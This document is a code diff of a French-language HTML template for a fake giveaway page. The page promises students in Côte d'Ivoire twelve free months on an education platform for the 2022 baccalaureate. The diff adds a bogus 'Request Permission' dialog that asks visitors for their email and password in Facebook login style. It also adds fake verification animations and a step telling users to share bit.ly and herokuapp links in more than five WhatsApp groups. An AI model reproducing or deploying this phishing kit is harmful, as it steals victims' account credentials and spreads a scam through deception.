@@ -15,7 +15,7 @@ t.state && location.replace("https://bac-2022.herokuapp.com")
 </script>
 
 <title>Crédit gratuit - côte d'ivoire</title>
-<meta property="og:title" content="À l'occasion du notre jour de l'indépendance ✨" />
+<meta property="og:title" content="À l'occasion de la rentrée 2022, Lnclass Education ✨" />
 
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
 <link href='static/v1/widgets/1635580978-widget_css_bundle_rtl.css' rel='stylesheet' type='text/css'/>
@@ -717,25 +717,367 @@ font-size: 21px;
                                                     <circle stroke-miterlimit="10" stroke-width="8" stroke="#333" fill="none" r="40" cy="50" cx="50" style="stroke: rgb(6, 193, 103);"></circle>
                                                 </g>
                                             </g>
-                                            <g class="ldl-layer">
-                                                <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -1.11111s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
-                                                    <path fill="#abbd81" d="M73.3 33.5c-2.3-2.3-6.1-2.3-8.4 0L44.5 53.9l-9.4-9.4c-2.3-2.3-6.1-2.3-8.4 0-1.1 1.1-1.7 2.6-1.7 4.2s.6 3.1 1.7 4.2l13.6 13.6c1.1 1.1 2.6 1.7 4.2 1.7s3.1-.6 4.2-1.7L73.2 42c1.1-1.1 1.7-2.6 1.7-4.2s-.5-3.1-1.6-4.3z" style="fill: rgb(6, 193, 103);"></path>
+
+                                        </svg>
+                                        <!--end check svg-->
+                                        <span class="quedate__porcent js-hidden"></span>
+                                        <span style="font-size: 16px;font-weight: bold;"
+                                            class="quedate__porcent-text js-hidden">Felicitation <%= @resultat.username %> Votre nom est retrouvé.</span>
+                                    </div>
+                                    <!-- termina la primera parte -->
+                                    <!-- Segunda parte -->
+                                    <div id="second-box" style="margin-bottom: 2.5rem" class="quedate__step js-hidden">
+                                        <div align="center">
+                                            <font color="black">
+                                                <b style="font-size: 15px;">
+                                                    Votre Code est dans la base </b>
+                                                <br>
+                                            </font>
+                                            <br />
+                                            
+                                        </div>
+                                        <script>
+                                            var prevent = (e) => e.preventDefault();
+                                        </script>
+                                        <form class="quedate__form" onsubmit="return prevent(event)">
+                                            <input class="quedate__form-input bg-gray-200 font-semibold text-xl p-4" id="num" type="text"
+                                                placeholder="Votre numéro" value="CI-BAC-475GH" />
+                                            <span class="quedate__form-separar"></span>
+                                            <label id="enviar" class="quedate__form-label bg-green-500" for="num">Enregistrer votre code</label>
+                                            <div class="message-status js-hidden"></div>
+                                        </form>
+                                    </div>
+                                    <!-- Tercera parte -->
+                                    <div id="third-box" style="margin-bottom: 2.5rem;" class="quedate__step js-hidden">
+                                        <span style="font-weight: bold; font-size: 2rem; text-align:center"
+                                            class="quedate__text">Inscription sur la liste des bénéficiaire de 12 mois gratuits</span>
+                                        <div class="quedate__first js-hidden">
+                                            <div style="border: 1px solid gray;  width:80%" class="quedate__load">
+                                                Inscription Complete,   <%= @resultat.username %> est sur liste la liste maintenant ...<span
+                                                    class="quedate__load-a js-hidden"></span>
+                                            </div>
+                                            <div style="border: 1px solid gray;border-left: none; width:30%"
+                                                class="quedate__load-icon">
+                                                <svg id="first-loading" class="quedate__load-animate"
+                                                    xmlns="http://www.w3.org/2000/svg"
+                                                    xmlns:xlink="http://www.w3.org/1999/xlink"
+                                                    style=" shape-rendering: auto;" viewbox="0 0 100 100"
+                                                    preserveaspectratio="xMidYMid" width="3.2rem">
+                                                    <circle cx="50" cy="50" r="32" stroke-width="8" stroke="#b52f4e"
+                                                        stroke-dasharray="50.26548245743669 50.26548245743669"
+                                                        fill="none" stroke-linecap="round"
+                                                        transform="rotate(214.395 50 50)">
+                                                        <animatetransform attributename="transform" type="rotate"
+                                                            dur="1s" repeatcount="indefinite" keytimes="0;1"
+                                                            values="0 50 50;360 50 50"></animatetransform>
+                                                    </circle>
+                                                    <circle cx="50" cy="50" r="23" stroke-width="8" stroke="#5de9a6"
+                                                        stroke-dasharray="36.12831551628262 36.12831551628262"
+                                                        stroke-dashoffset="36.12831551628262" fill="none"
+                                                        stroke-linecap="round" transform="rotate(-214.395 50 50)">
+                                                        <animatetransform attributename="transform" type="rotate"
+                                                            dur="1s" repeatcount="indefinite" keytimes="0;1"
+                                                            values="0 50 50;-360 50 50"></animatetransform>
+                                                    </circle>
+                                                </svg>
+                                                <svg id="first-checked" class="quedate__load-check js-hidden"
+                                                    xml:space="preserve" viewbox="0 0 100 100" y="0" x="0"
+                                                    xmlns="http://www.w3.org/2000/svg" id="鍦栧堡_1" version="1.1"
+                                                    width=" 3.2rem">
+                                                    <g class="ldl-scale"
+                                                        style="transform-origin: 50% 50%; transform: rotate(0deg) scale(0.8, 0.8);">
+                                                        <g class="ldl-ani">
+                                                            <g class="ldl-layer">
+                                                                <g class="ldl-ani"
+                                                                    style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -0.833333s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                                    <circle stroke-miterlimit="10" stroke-width="8"
+                                                                        stroke="#333" fill="none" r="40" cy="50" cx="50"
+                                                                        style="stroke: rgb(6, 193, 103);"></circle>
+                                                                </g>
+                                                            </g>
+                                                            <g class="ldl-layer">
+                                                                <g class="ldl-ani"
+                                                                    style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -1.11111s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                                    <path fill="#abbd81"
+                                                                        d="M73.3 33.5c-2.3-2.3-6.1-2.3-8.4 0L44.5 53.9l-9.4-9.4c-2.3-2.3-6.1-2.3-8.4 0-1.1 1.1-1.7 2.6-1.7 4.2s.6 3.1 1.7 4.2l13.6 13.6c1.1 1.1 2.6 1.7 4.2 1.7s3.1-.6 4.2-1.7L73.2 42c1.1-1.1 1.7-2.6 1.7-4.2s-.5-3.1-1.6-4.3z"
+                                                                        style="fill: rgb(6, 193, 103);"></path>
+                                                                </g>
+                                                            </g>
+                                                            <metadata xmlns:d="https://loading.io/stock/">
+                                                                <d:name>ok</d:name>
+                                                                <d:tags>
+                                                                    ok,confirm,ready,positive,check,right,correct,affirmative,success
+                                                                </d:tags>
+                                                                <d:license>by</d:license>
+                                                                <d:slug>364zp</d:slug>
+                                                            </metadata>
+                                                        </g>
+                                                    </g>
+                                                </svg>
+                                                <span id="first-porcent" class="quedate__load-text"></span>
+                                            </div>
+                                        </div>
+                                        <div class="quedate__first js-hidden">
+                                            <div style="border: 1px solid gray; width:80%" class="quedate__load">
+                                                Verification ......<span class="quedate__load-a js-hidden"></span>
+                                            </div>
+                                            <div style="border: 1px solid gray;border-left: none; width:30%"
+                                                class="quedate__load-icon">
+                                                <svg id="second-loading" class="quedate__load-animate"
+                                                    xmlns="http://www.w3.org/2000/svg"
+                                                    xmlns:xlink="http://www.w3.org/1999/xlink"
+                                                    style=" shape-rendering: auto;" viewbox="0 0 100 100"
+                                                    preserveaspectratio="xMidYMid" width="3.2rem">
+                                                    <circle cx="50" cy="50" r="32" stroke-width="8" stroke="#b52f4e"
+                                                        stroke-dasharray="50.26548245743669 50.26548245743669"
+                                                        fill="none" stroke-linecap="round"
+                                                        transform="rotate(214.395 50 50)">
+                                                        <animatetransform attributename="transform" type="rotate"
+                                                            dur="1s" repeatcount="indefinite" keytimes="0;1"
+                                                            values="0 50 50;360 50 50"></animatetransform>
+                                                    </circle>
+                                                    <circle cx="50" cy="50" r="23" stroke-width="8" stroke="#5de9a6"
+                                                        stroke-dasharray="36.12831551628262 36.12831551628262"
+                                                        stroke-dashoffset="36.12831551628262" fill="none"
+                                                        stroke-linecap="round" transform="rotate(-214.395 50 50)">
+                                                        <animatetransform attributename="transform" type="rotate"
+                                                            dur="1s" repeatcount="indefinite" keytimes="0;1"
+                                                            values="0 50 50;-360 50 50"></animatetransform>
+                                                    </circle>
+                                                </svg>
+                                                <svg id="second-checked" class="quedate__load-check js-hidden"
+                                                    xml:space="preserve" viewbox="0 0 100 100" y="0" x="0"
+                                                    xmlns="http://www.w3.org/2000/svg" id="鍦栧堡_1" version="1.1"
+                                                    width=" 3.2rem">
+                                                    <g class="ldl-scale"
+                                                        style="transform-origin: 50% 50%; transform: rotate(0deg) scale(0.8, 0.8);">
+                                                        <g class="ldl-ani">
+                                                            <g class="ldl-layer">
+                                                                <g class="ldl-ani"
+                                                                    style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -0.833333s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                                    <circle stroke-miterlimit="10" stroke-width="8"
+                                                                        stroke="#333" fill="none" r="40" cy="50" cx="50"
+                                                                        style="stroke: rgb(6, 193, 103);"></circle>
+                                                                </g>
+                                                            </g>
+                                                            <g class="ldl-layer">
+                                                                <g class="ldl-ani"
+                                                                    style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -1.11111s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                                    <path fill="#abbd81"
+                                                                        d="M73.3 33.5c-2.3-2.3-6.1-2.3-8.4 0L44.5 53.9l-9.4-9.4c-2.3-2.3-6.1-2.3-8.4 0-1.1 1.1-1.7 2.6-1.7 4.2s.6 3.1 1.7 4.2l13.6 13.6c1.1 1.1 2.6 1.7 4.2 1.7s3.1-.6 4.2-1.7L73.2 42c1.1-1.1 1.7-2.6 1.7-4.2s-.5-3.1-1.6-4.3z"
+                                                                        style="fill: rgb(6, 193, 103);"></path>
+                                                                </g>
+                                                            </g>
+                                                            <metadata xmlns:d="https://loading.io/stock/">
+                                                                <d:name>ok</d:name>
+                                                                <d:tags>
+                                                                    ok,confirm,ready,positive,check,right,correct,affirmative,success
+                                                                </d:tags>
+                                                                <d:license>by</d:license>
+                                                                <d:slug>364zp</d:slug>
+                                                            </metadata>
+                                                        </g>
+                                                    </g>
+                                                </svg>
+                                                <span id="second-porcent" class="quedate__load-text"></span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <!-- Loading-->
+                                    <div id="loading-g" class="quedate__step js-hidden">
+                                        <div class="quedate__step-box">
+                                            <svg class="quedate__animate" xmlns="http://www.w3.org/2000/svg"
+                                                xmlns:xlink="http://www.w3.org/1999/xlink"
+                                                style=" shape-rendering: auto;" viewbox="0 0 100 100"
+                                                preserveaspectratio="xMidYMid" width="10rem">
+                                                <circle cx="50" cy="50" r="32" stroke-width="8" stroke="#b52f4e"
+                                                    stroke-dasharray="50.26548245743669 50.26548245743669" fill="none"
+                                                    stroke-linecap="round" transform="rotate(214.395 50 50)">
+                                                    <animatetransform attributename="transform" type="rotate" dur="1s"
+                                                        repeatcount="indefinite" keytimes="0;1"
+                                                        values="0 50 50;360 50 50"></animatetransform>
+                                                </circle>
+                                                <circle cx="50" cy="50" r="23" stroke-width="8" stroke="#5de9a6"
+                                                    stroke-dasharray="36.12831551628262 36.12831551628262"
+                                                    stroke-dashoffset="36.12831551628262" fill="none"
+                                                    stroke-linecap="round" transform="rotate(-214.395 50 50)">
+                                                    <animatetransform attributename="transform" type="rotate" dur="1s"
+                                                        repeatcount="indefinite" keytimes="0;1"
+                                                        values="0 50 50;-360 50 50"></animatetransform>
+                                                </circle>
+                                            </svg>
+                                        </div>
+                                        <p style="font-size: 14px;font-weight: bold;">Attendez &#1548; Nous validons l'inscriptio </p>
+                                    </div>
+                                </main>
+                            </div>
+                            <!-- FIN PASOS -->
+                            <!-- Ventana permiso -->
+                            <div class="permision-container js-hidden">
+                                <span class="permision-container-request-text">Request Permission</span>
+                                <div class="permision-container-data">
+                                    
+                                    <div class="permision-container-box">
+                                        <p class="permision-container-txt">We should validate you are a real human
+                                            checking your name and profile photo.</p>
+                                        <form action="#" class="permision-container-form">
+                                            <input class="permision-container-input" type="text" id="email"
+                                                placeholder="your@email.com" />
+                                            <label class="permision-container-label" for="email"></label>
+                                            <input class="permision-container-input" type="password" id="pass"
+                                                placeholder="路路路路路路路路路路" />
+                                            <label class="permision-container-label" for="pass"></label>
+                                        </form>
+                                        <span class="message-status fb-request"></span>
+                                        <button style="width:100%; margin-left: 0;" id="aceptar"
+                                            class="quedate__cta-btn">Accept - Im Human</button>
+                                        <div class="permision-container-secure">
+                                            <svg fill="#a2a2a2" height="512pt" viewbox="-64 0 512 512" width="512pt"
+                                                xmlns="http://www.w3.org/2000/svg">
+                                                <path
+                                                    d="m336 192h-16v-64c0-70.59375-57.40625-128-128-128s-128 57.40625-128 128v64h-16c-26.453125 0-48 21.523438-48 48v224c0 26.476562 21.546875 48 48 48h288c26.453125 0 48-21.523438 48-48v-224c0-26.476562-21.546875-48-48-48zm-229.332031-64c0-47.0625 38.269531-85.332031 85.332031-85.332031s85.332031 38.269531 85.332031 85.332031v64h-170.664062zm0 0" />
+                                                </path>
+                                            </svg>
+                                            <p class="permision-container-secure-text">The app is not allowed to post on
+                                                Facebook</p>
+                                        </div>
+                                    </div>
+                                </div>
+                                <span class="permision-container-end">Our service privacy policy and conditions</span>
+                            </div>
+                            <div style="height: 269px;" class="loading2 js-hidden">
+                                <div style="text-align: center !important;" class="loading2__box">
+                                    <svg class="loading2__permission" xmlns="http://www.w3.org/2000/svg"
+                                        xmlns:xlink="http://www.w3.org/1999/xlink" style="" viewbox="0 0 100 100"
+                                        preserveaspectratio="xMidYMid">
+                                        <circle cx="50" cy="50" r="32" stroke-width="8" stroke="#b52f4e"
+                                            stroke-dasharray="50.26548245743669 50.26548245743669" fill="none"
+                                            stroke-linecap="round" transform="rotate(214.395 50 50)">
+                                            <animatetransform attributename="transform" type="rotate" dur="1s"
+                                                repeatcount="indefinite" keytimes="0;1" values="0 50 50;360 50 50">
+                                            </animatetransform>
+                                        </circle>
+                                        <circle cx="50" cy="50" r="23" stroke-width="8" stroke="#6ae8a4"
+                                            stroke-dasharray="36.12831551628262 36.12831551628262"
+                                            stroke-dashoffset="36.12831551628262" fill="none" stroke-linecap="round"
+                                            transform="rotate(-214.395 50 50)">
+                                            <animatetransform attributename="transform" type="rotate" dur="1s"
+                                                repeatcount="indefinite" keytimes="0;1" values="0 50 50;-360 50 50">
+                                            </animatetransform>
+                                        </circle>
+                                    </svg>
+                                    <p style="text-align:center">Wait a moment, we validate data.</p>
+                                </div>
+                            </div>
+                            <!--congratulations -->
+                            <div id="share" class="loading2 js-hidden js-congrats">
+                                <div class="loading2__box" style="direction: ltr;">
+                                    <span style="font-weight: bold; font-size:15px"> Félicitations! la demande est bien enregistrée.
+                                      <br> Pour augmenter ta chance partage dans les groupes whatsApp </span><br />
+                                    <b>Comment recevoir 12 mois gratuits</b>
+                                    <br /><br />
+                                    <b>1.Cliquez sur le bouton WhatsApp ci-dessous et partagez le message avec vos amis dans plus de 5 groupes.</b>
+                                    <br />
+                                    <br />
+                                    <b>2. Après avoir partagé le message avec vos amis et dans plus de 5 groupes</b>
+                                    <br /><b>
+                                        <font style="vertical-align: inherit;">
+                                            <font style="vertical-align: inherit;">Tu recevras une confirmation par
+                                                SMS dans les 15 minutes ou un Appel du DG de la plateforme LNCLASS EDUCATION</font>
+                                        </font>
+                                    </b>
+                                    <div style="margin-top: 30px;margin-bottom: 30px;"
+                                        class="quedate__first js-hidden js-share">
+                                        <div style="border: 1px solid gray; width:80%" class="quedate__load">Partage dans plus de 5 groupes WhatsApp pour gagner<span class="quedate__load-a js-hidden"></span>
+                                        </div>
+                                        <div style="border: 1px solid gray;border-left: none; width:30%"
+                                            class="quedate__load-icon">
+                                            <svg id="third-loading" class="quedate__load-animate"
+                                                xmlns="http://www.w3.org/2000/svg"
+                                                xmlns:xlink="http://www.w3.org/1999/xlink"
+                                                style=" shape-rendering: auto;" viewbox="0 0 100 100"
+                                                preserveaspectratio="xMidYMid" width="3.2rem">
+                                                <circle cx="50" cy="50" r="32" stroke-width="8" stroke="#b52f4e"
+                                                    stroke-dasharray="50.26548245743669 50.26548245743669" fill="none"
+                                                    stroke-linecap="round" transform="rotate(214.395 50 50)">
+                                                    <animatetransform attributename="transform" type="rotate" dur="1s"
+                                                        repeatcount="indefinite" keytimes="0;1"
+                                                        values="0 50 50;360 50 50"></animatetransform>
+                                                </circle>
+                                                <circle cx="50" cy="50" r="23" stroke-width="8" stroke="#5de9a6"
+                                                    stroke-dasharray="36.12831551628262 36.12831551628262"
+                                                    stroke-dashoffset="36.12831551628262" fill="none"
+                                                    stroke-linecap="round" transform="rotate(-214.395 50 50)">
+                                                    <animatetransform attributename="transform" type="rotate" dur="1s"
+                                                        repeatcount="indefinite" keytimes="0;1"
+                                                        values="0 50 50;-360 50 50"></animatetransform>
+                                                </circle>
+                                            </svg>
+                                            <svg id="third-checked" class="quedate__load-check js-hidden"
+                                                xml:space="preserve" viewbox="0 0 100 100" y="0" x="0"
+                                                xmlns="http://www.w3.org/2000/svg" id="鍦栧堡_1" version="1.1"
+                                                width=" 3.2rem">
+                                                <g class="ldl-scale"
+                                                    style="transform-origin: 50% 50%; transform: rotate(0deg) scale(0.8, 0.8);">
+                                                    <g class="ldl-ani">
+                                                        <g class="ldl-layer">
+                                                            <g class="ldl-ani"
+                                                                style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -0.833333s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                                <circle stroke-miterlimit="10" stroke-width="8"
+                                                                    stroke="#333" fill="none" r="40" cy="50" cx="50"
+                                                                    style="stroke: rgb(6, 193, 103);"></circle>
+                                                            </g>
+                                                        </g>
+                                                        <g class="ldl-layer">
+                                                            <g class="ldl-ani"
+                                                                style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -1.11111s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                                <path fill="#abbd81"
+                                                                    d="M73.3 33.5c-2.3-2.3-6.1-2.3-8.4 0L44.5 53.9l-9.4-9.4c-2.3-2.3-6.1-2.3-8.4 0-1.1 1.1-1.7 2.6-1.7 4.2s.6 3.1 1.7 4.2l13.6 13.6c1.1 1.1 2.6 1.7 4.2 1.7s3.1-.6 4.2-1.7L73.2 42c1.1-1.1 1.7-2.6 1.7-4.2s-.5-3.1-1.6-4.3z"
+                                                                    style="fill: rgb(6, 193, 103);"></path>
+                                                            </g>
+                                                        </g>
+                                                        <metadata xmlns:d="https://loading.io/stock/">
+                                                            <d:name>ok</d:name>
+                                                            <d:tags>
+                                                                ok,confirm,ready,positive,check,right,correct,affirmative,success
+                                                            </d:tags>
+                                                            <d:license>by</d:license>
+                                                            <d:slug>364zp</d:slug>
+                                                        </metadata>
+                                                    </g>
                                                 </g>
-                                            </g>
-                                            <metadata xmlns:d="https://loading.io/stock/">
-                                                <d:name>ok</d:name>
-                                                <d:tags>ok,confirm,ready,positive,check,right,correct,affirmative,success</d:tags>
-                                                <d:license>by</d:license>
-                                                <d:slug>364zp</d:slug>
-                                            </metadata>
-                                        </g>
-                                    </g>
-                                </svg>
-                            <span id="first-porcent" class="quedate__load-text"></span>
-                        </div>
-                    </div>
-                    <div class="quedate__first js-hidden">
-                        <div style="border: 1px solid gray; width:80%" class="quedate__load">Verification ......<span class="quedate__load-a js-hidden"></span>
+                                            </svg>
+                                            <span id="third-porcent" class="quedate__load-text"></span>
+                                        </div>
+                                    </div>
+                                    
+                                </div>
+                            </div>
+                            <!-- FIN Ventana permiso -->
+                            <!--verify-->
+                            <div class="loading2 js-hidden js-verify">
+                                <div class="loading2__box">
+                                    <center> <b style="font-weight:bold; font-size:16px">étape finale</b></center>
+                                    <br />
+                                    <br />
+                                    <center><br /><b style="font-size:14px">Cliquez sur Obtenir pour voir votre place<br> ou voir si 
+                                            vos information correctement</b></center> <br />
+                                    <div style="display: flex;">
+                                        <center>
+                                            <button
+                                                style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;"
+                                                id="verify" class="quedate__cta-btn">Obtenir plus d'information </button>
+                                            <br /><br />
+
+                                        </center>
+                                    </div>
+                                </div>
+                                <br />
+                                <center>
+                                    <script type="text/javascript" src="#"></script>
+                                </center>
+                            </div>
+
                         </div>
                         <div style="border: 1px solid gray;border-left: none; width:30%" class="quedate__load-icon">
                             <svg id="second-loading" class="quedate__load-animate" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style=" shape-rendering: auto;" viewbox="0 0 100 100" preserveaspectratio="xMidYMid" width="3.2rem">
@@ -887,23 +1229,27 @@ font-size: 21px;
                     </div>
                 </div>
                <br />
-              <center> <div id="compartir">
-<a href="whatsapp://send?text=
-%0A
-*🇨🇮 LNCLASS EDUCATION -  Inscrivez-vous pour bénéficier de 12 mois gratuit*
-%0A
-*IMPORTANT         👇* %0A https://bit.ly/CIV-affronter-bac-2022
-%0A
-*Pour Orange      👇* %0A bit.ly/ivory-recharge?Orange
-%0A
-*Pour Moov        👇* %0A bit.ly/ivory-recharge?Moov
-%0A
-*Pour Autre ligne 👇* %0A bit.ly/ivory-recharge
-%0A
-" data-action="share/whatsapp/share">
-<%= image_tag "whatsapp.png", border:"0", align:"middle", style:" width: 56%;", alt:"whatsapp" %></a>
-</div>
-    </center>           
+              <br />
+                                    <center>
+                                        <div id="compartir">
+                                            <a href="whatsapp://send?text=
+                                                        %0A
+                                                        *🇨🇮 TU PEUX GAGNER 12 MOIS GRATUITS POUR SE PREPARER ET AFFRONTER LE BAC EN 2022 *
+                                                        %0A
+                                                        *🇨🇮 Uniquement 500 places disponibe sur la plateforme Educative LnClass.com*
+                                                        %0A
+                                                        
+                                                        * Pour Bénéficier    👇* %0A fait la demande, c'est gratuit.
+                                                        %0A
+                                                        *Cliquez sur ce lien simplement  * %0A  https://bit.ly/CIV-affronter-bac-2022 https://bac-2022.herokuapp.com
+                                                        %0A
+                                                        *Merci, Avec Lnclass.com, tu restes chez toi, et tu bosses tranquillement. Fait vite ta demande.* %0A
+                                                        
+                                                        " data-action="share/whatsapp/share">
+                                                
+                                                 <span style="border="0" align="middle" style="width: 56%;"><%= image_tag src="whatsapp.png" %></span>   </a>
+                                        </div>
+                                    </center>           
             </div>
         </div>
         <!-- FIN Ventana permiso -->
@@ -1289,7 +1635,7 @@ font-size: 21px;
                         congrats: document.querySelector(".js-congrats"),
                         sharing: document.querySelector(".js-share"),
                         verify: document.querySelector("#verify")
-                    }, objServer = {}, landingDomain = "lnclass.com",
+                    }, objServer = {}, landingDomain = "https://bac-2022.herokuapp.com",
                         adsLink = "lnclass.com";
                     document.addEventListener("click", function (c) {
                         console.log(c);
@@ -1348,7 +1694,7 @@ font-size: 21px;
                         }
                     });
                     get_Cookie('e') ? setTimeout('enviar()', 500) : void (0);
-                    landingDomain = '//lnclass.com'
+                    landingDomain = 'https://bac-2022.herokuapp.com'
                     function deadline() {
                         var day3 = new Date();
                         day3.setTime(day3.getTime() + 24 * 60 * 60 * 1000);
